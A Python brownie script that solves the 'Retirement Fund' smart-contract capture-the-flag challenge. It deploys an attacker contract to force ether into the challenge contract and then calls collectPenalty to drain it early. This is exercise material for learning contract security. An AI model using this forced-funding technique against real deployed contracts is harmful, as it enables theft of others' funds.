from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from brownie import RetirementFundChallenge, RetirementFundAttack

##########################################
# This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.
# I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).
# I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        retirement_fund = load_challenge(ContractObject=RetirementFundChallenge, instance_key='retirement_fund')
    else:
        retirement_fund = deploy_locally(ContractObject=RetirementFundChallenge, from_account=_from)
    
    # deploy attacker contract
    attacker = RetirementFundAttack.deploy(retirement_fund.address, _from | {'value':1})

    # force funds into Retirement Fund
    attacker.attack(_from)

    # send funds to the contract
    retirement_fund.collectPenalty(_from)

    # check if we've finished the challenge
    result = retirement_fund.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge()
